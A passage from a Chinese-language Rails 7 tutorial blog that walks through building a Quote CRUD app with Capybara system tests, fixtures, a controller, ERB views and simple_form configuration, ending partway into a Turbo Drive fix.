    <span class="token comment"># When we click on the link with the text "New quote"</span>
    <span class="token comment"># we expect to land on a page with the title "New quote"</span>
    click_on <span class="token string-literal"><span class="token string">"New quote"</span></span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"New quote"</span></span>

    <span class="token comment"># When we fill in the name input with "Capybara quote"</span>
    <span class="token comment"># and we click on "Create Quote"</span>
    fill_in <span class="token string-literal"><span class="token string">"Name"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Capybara quote"</span></span>
    click_on <span class="token string-literal"><span class="token string">"Create quote"</span></span>

    <span class="token comment"># We expect to be back on the page with the title "Quotes"</span>
    <span class="token comment"># and to see our "Capybara quote" added to the list</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>
    assert_text <span class="token string-literal"><span class="token string">"Capybara quote"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里就是简单的增删改查测试用例，但开始之前，我们需要一些测试数据</p>
<p>使用 fixtures 可以创建假数据，在测试执行前，默认会将数据加载到测试数据库中。</p>
<ul>
<li>创建quotes的fixtures文件</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> test/fixtures/quotes.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>创建数据</li>
</ul>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># test/fixtures/quotes.yml</span>

<span class="token key atrule">first</span><span class="token punctuation">:</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> First quote

<span class="token key atrule">second</span><span class="token punctuation">:</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Second quote

<span class="token key atrule">third</span><span class="token punctuation">:</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Third quote<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>我们再添加两个测试用例</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/quotes_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">QuotesTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  setup <span class="token keyword">do</span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> quotes<span class="token punctuation">(</span><span class="token symbol">:first</span><span class="token punctuation">)</span> <span class="token comment"># Reference to the first fixture quote</span>
  <span class="token keyword">end</span>

  <span class="token comment"># ...</span>
  <span class="token comment"># 我们之前写的测试用例</span>
  <span class="token comment"># ...</span>

  test <span class="token string-literal"><span class="token string">"Showing a quote"</span></span> <span class="token keyword">do</span>
    visit quotes_path
    click_link <span class="token variable">@quote</span><span class="token punctuation">.</span>name

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>name
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Updating a quote"</span></span> <span class="token keyword">do</span>
    visit quotes_path
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>

    click_on <span class="token string-literal"><span class="token string">"Edit"</span></span><span class="token punctuation">,</span> <span class="token symbol">match</span><span class="token operator">:</span> <span class="token symbol">:first</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Edit quote"</span></span>

    fill_in <span class="token string-literal"><span class="token string">"Name"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Updated quote"</span></span>
    click_on <span class="token string-literal"><span class="token string">"Update quote"</span></span>

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>
    assert_text <span class="token string-literal"><span class="token string">"Updated quote"</span></span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Destroying a quote"</span></span> <span class="token keyword">do</span>
    visit quotes_path
    assert_text <span class="token variable">@quote</span><span class="token punctuation">.</span>name

    click_on <span class="token string-literal"><span class="token string">"Delete"</span></span><span class="token punctuation">,</span> <span class="token symbol">match</span><span class="token operator">:</span> <span class="token symbol">:first</span>
    assert_no_text <span class="token variable">@quote</span><span class="token punctuation">.</span>name
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们执行：<code>bin/rails test:system</code>，发现都失败，因为缺少Quote模型，路由，控制器。我们现在添加需要的部分。</p>
<ul>
<li>创建模型和迁移文件</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rails generate model Quote name:string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>模型增加非空校验</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  validates <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>修改迁移文件，保证字段非空，预防我们在控制台内出错</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># db/migrate/XXXXXXXXXXXXXX_create_quotes.rb</span>

<span class="token keyword">class</span> <span class="token class-name">CreateQuotes</span> <span class="token operator">&lt;</span> ActiveRecord<span class="token double-colon punctuation">::</span>Migration<span class="token punctuation">[</span><span class="token number">7.0</span><span class="token punctuation">]</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">change</span></span>
    create_table <span class="token symbol">:quotes</span> <span class="token keyword">do</span> <span class="token operator">|</span>t<span class="token operator">|</span>
      t<span class="token punctuation">.</span>string <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span>

      t<span class="token punctuation">.</span>timestamps
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>执行迁移文件，这时候表就创建好了</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails db:migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="添加路由和控制器"><a href="#添加路由和控制器" class="headerlink" title="添加路由和控制器"></a>添加路由和控制器</h3><ul>
<li>生成<code>Quote</code>的Controller控制器</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails generate controller Quotes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>增加<code>Quote</code>的增删改查路由</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># config/routes.rb</span>

Rails<span class="token punctuation">.</span>application<span class="token punctuation">.</span>routes<span class="token punctuation">.</span>draw <span class="token keyword">do</span>
  resources <span class="token symbol">:quotes</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>编写Controller And Action</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">QuotesController</span> <span class="token operator">&lt;</span> ApplicationController
  before_action <span class="token symbol">:set_quote</span><span class="token punctuation">,</span> <span class="token symbol">only</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:show</span><span class="token punctuation">,</span> <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">:update</span><span class="token punctuation">,</span> <span class="token symbol">:destroy</span><span class="token punctuation">]</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">index</span></span>
    <span class="token variable">@quotes</span> <span class="token operator">=</span> Quote<span class="token punctuation">.</span>all
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">show</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">new</span></span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> <span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> <span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>save
      redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:new</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">edit</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
    <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>
      redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully updated."</span></span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:edit</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
    <span class="token variable">@quote</span><span class="token punctuation">.</span>destroy
    redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully destroyed."</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set_quote</span></span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> Quote<span class="token punctuation">.</span>find<span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:id</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">quote_params</span></span>
    params<span class="token punctuation">.</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token symbol">:quote</span><span class="token punctuation">)</span><span class="token punctuation">.</span>permit<span class="token punctuation">(</span><span class="token symbol">:name</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="添加视图"><a href="#添加视图" class="headerlink" title="添加视图"></a>添加视图</h3><blockquote>
<p>注意：这里我们会添加一些css类名，下一章我们将构建自己的css文件系统。所以你只需要简单的复制即可</p>
</blockquote>
<ul>
<li><code>Quotes#index</code>页面</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    &lt;%= link_to "New quote",
                new_quote_path,
                class: "btn btn--primary" %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= render @quotes %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>抽取局部共用文件<code>_quote.html.erb</code>，遍历<code>@quotes</code>，并渲染视图</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_quote.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to quote.name, quote_path(quote) %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote__actions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    &lt;%= button_to "Delete",
                  quote_path(quote),
                  method: :delete,
                  class: "btn btn--light" %>
    &lt;%= link_to "Edit",
                edit_quote_path(quote),
                class: "btn btn--light" %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><code>new.html.erb 和 edit.html.erb</code>是很类似的</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/new.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quotes"), quotes_path %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>New quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= render "form", quote: @quote %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
&lt;%# app/views/quotes/edit.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quote"), quote_path(@quote) %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Edit quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= render "form", quote: @quote %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>抽取局部共用文件<code>_form.html.erb</code>，也就修改与新增的表单</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_form.html.erb %>

&lt;%= simple_form_for quote, html: &#123; class: "quote form" &#125; do |f| %>
  &lt;% if quote.errors.any? %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error-message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= quote.errors.full_messages.to_sentence.capitalize %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  &lt;% end %>

  &lt;%= f.input :name, input_html: &#123; autofocus: true &#125; %>
  &lt;%= f.submit class: "btn btn--secondary" %>
&lt;% end %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到我们的表单标签很简易，并且这里的表单可以不需要我们鼠标操作，直接键盘操作数据，因为使用到<code>simple_form gem</code>，所以添加到Gemfile中，并下载</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Gemfile</span>

gem <span class="token string">"simple_form"</span>, <span class="token string">"~> 5.1.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>gem添加后，执行：</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bundle <span class="token function">install</span>
bin/rails generate simple_form:install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>simple_form可以让表单更容易操作，并使用统一的css样式，现在我们修改配置。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># config/initializers/simple_form.rb</span>

SimpleForm<span class="token punctuation">.</span>setup <span class="token keyword">do</span> <span class="token operator">|</span>config<span class="token operator">|</span>
  <span class="token comment"># Wrappers configration</span>
  config<span class="token punctuation">.</span>wrappers <span class="token symbol">:default</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form__group"</span></span> <span class="token keyword">do</span> <span class="token operator">|</span>b<span class="token operator">|</span>
    b<span class="token punctuation">.</span>use <span class="token symbol">:html5</span>
    b<span class="token punctuation">.</span>use <span class="token symbol">:placeholder</span>
    b<span class="token punctuation">.</span>use <span class="token symbol">:label</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"visually-hidden"</span></span>
    b<span class="token punctuation">.</span>use <span class="token symbol">:input</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form__input"</span></span><span class="token punctuation">,</span> <span class="token symbol">error_class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form__input--invalid"</span></span>
  <span class="token keyword">end</span>

  <span class="token comment"># Default configuration</span>
  config<span class="token punctuation">.</span>generate_additional_classes_for <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  config<span class="token punctuation">.</span>default_wrapper                 <span class="token operator">=</span> <span class="token symbol">:default</span>
  config<span class="token punctuation">.</span>button_class                    <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"btn"</span></span>
  config<span class="token punctuation">.</span>label_text                      <span class="token operator">=</span> lambda <span class="token punctuation">&#123;</span> <span class="token operator">|</span>label<span class="token punctuation">,</span> _<span class="token punctuation">,</span> _<span class="token operator">|</span> label <span class="token punctuation">&#125;</span>
  config<span class="token punctuation">.</span>error_notification_tag          <span class="token operator">=</span> <span class="token symbol">:div</span>
  config<span class="token punctuation">.</span>error_notification_class        <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"error_notification"</span></span>
  config<span class="token punctuation">.</span>browser_validations             <span class="token operator">=</span> <span class="token boolean">false</span>
  config<span class="token punctuation">.</span>boolean_style                   <span class="token operator">=</span> <span class="token symbol">:nested</span>
  config<span class="token punctuation">.</span>boolean_label_class             <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"form__checkbox-label"</span></span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的：<code>config.default_wrapper = :default</code>可以保证我们系统中的表单使用统一的样式。</p>
<p>当我们使用<code>f.input :name</code>构建<code>Quote</code>时，默认包装器将会生成以下的HTML：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form__group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>visually-hidden<span class="token punctuation">"</span></span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote_name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    Name
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form__input<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote[name]<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote_name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Simple form也帮助我们定义了标签文本提示，在另一个配置文件中。</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># config/locales/simple_form.en.yml</span>

<span class="token key atrule">en</span><span class="token punctuation">:</span>
  <span class="token key atrule">simple_form</span><span class="token punctuation">:</span>
    <span class="token key atrule">placeholders</span><span class="token punctuation">:</span> <span class="token comment"># 文本提示</span>
      <span class="token key atrule">quote</span><span class="token punctuation">:</span>
        <span class="token key atrule">name</span><span class="token punctuation">:</span> Name of your quote
    <span class="token key atrule">labels</span><span class="token punctuation">:</span>  <span class="token comment"># 标签提示</span>
      <span class="token key atrule">quote</span><span class="token punctuation">:</span>
        <span class="token key atrule">name</span><span class="token punctuation">:</span> Name

  <span class="token key atrule">helpers</span><span class="token punctuation">:</span>
    <span class="token key atrule">submit</span><span class="token punctuation">:</span> <span class="token comment"># 按钮文本</span>
      <span class="token key atrule">quote</span><span class="token punctuation">:</span>
        <span class="token key atrule">create</span><span class="token punctuation">:</span> Create quote <span class="token comment"># 如果为新的数据，显示创建</span>
        <span class="token key atrule">update</span><span class="token punctuation">:</span> Update quote <span class="token comment"># 如果为老的数据，显示修改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>最后就是<code>Quotes#show</code>页面</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/show.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quotes"), quotes_path %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>
      &lt;%= @quote.name %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们再跑：<code>bin/rails test:system</code> 就可以通过了，也可以页面中测试。</p>
<p>你会发现测试时，浏览器会自动打开，并执行测试流程，这个比较费时，你可以配置以下内容，来关闭浏览器打开设置</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/application_system_test_case.rb</span>

<span class="token keyword">class</span> <span class="token class-name">ApplicationSystemTestCase</span> <span class="token operator">&lt;</span> ActionDispatch<span class="token double-colon punctuation">::</span>SystemTestCase
  <span class="token comment"># Change :chrome with :headless_chrome</span>
  driven_by <span class="token symbol">:selenium</span><span class="token punctuation">,</span> <span class="token symbol">using</span><span class="token operator">:</span> <span class="token symbol">:headless_chrome</span><span class="token punctuation">,</span> <span class="token symbol">screen_size</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1400</span><span class="token punctuation">,</span> <span class="token number">1400</span><span class="token punctuation">]</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>需要注意我们安装了新的gem并且修改了配置文件，所以应该项目重新启动，保证内容加载完毕。</p>
<h3 id="Turbo-Drive-Form-responses-must-redirect-to-another-location"><a href="#Turbo-Drive-Form-responses-must-redirect-to-another-location" class="headerlink" title="Turbo Drive: Form responses must redirect to another location"></a>Turbo Drive: Form responses must redirect to another location</h3><p>现在还有一个问题，当我们提交时，打开浏览器的控制台，我们将会在Console中看到：<code>Form responses must redirect to another location</code>。</p>
<p>这是由于<code>Rails7中的Turbo Drive</code>带来的变化，我们将在<code>Turbo Drive</code>中讨论这一话题，如果你遇到这个问题，只需要增加：<code>status: :unprocessable_entity</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">QuotesController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># ...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
